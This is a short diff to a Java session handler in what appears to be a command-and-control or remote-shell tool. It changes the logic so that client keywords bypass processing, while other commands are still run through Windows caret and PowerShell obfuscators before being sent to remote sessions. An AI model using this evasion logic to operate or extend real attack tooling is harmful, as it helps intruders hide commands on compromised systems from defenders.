@@ -82,13 +82,17 @@ public class SessionHandler implements Runnable {
 					}else if(command.equals(Commands.SESSION_END_OBFUSCATE_WINDOWS_COMMAND)) {
 						obfuscateWindowsCommandMode = false;
 					}else if(!cmm.processCmd(command, sessionId, sessionName)) {
-						if(obfuscateWindowsCommandMode) {
-							command = WindowsCarrotObfuscation.obfuscate(command);
-						}else if(command.startsWith(Commands.SESSION_OBFUSCATE_WINDOWS_COMMAND_PREFIX)) {
-							command = WindowsCarrotObfuscation.obfuscate(command.substring(Commands.SESSION_OBFUSCATE_WINDOWS_COMMAND_PREFIX.length()));
-						}else if(obfuscateWindowsPowershellMode) {
-							command = PowershellWrapperObfuscator.process(command);
+						//Check to see if the command is a reserved keyword for the client, and if not then do any terminal command processing
+						if(!Commands.isClientCommand(command)) {
+							if(obfuscateWindowsCommandMode) {
+								command = WindowsCarrotObfuscation.obfuscate(command);
+							}else if(command.startsWith(Commands.SESSION_OBFUSCATE_WINDOWS_COMMAND_PREFIX)) {
+								command = WindowsCarrotObfuscation.obfuscate(command.substring(Commands.SESSION_OBFUSCATE_WINDOWS_COMMAND_PREFIX.length()));
+							}else if(obfuscateWindowsPowershellMode) {
+								command = PowershellWrapperObfuscator.process(command);
+							}
 						}
+						
 						ioManager.sendCommand(sessionId, command);
 					}else if(command.equals("qSession")) {
 						stayAlive = false;
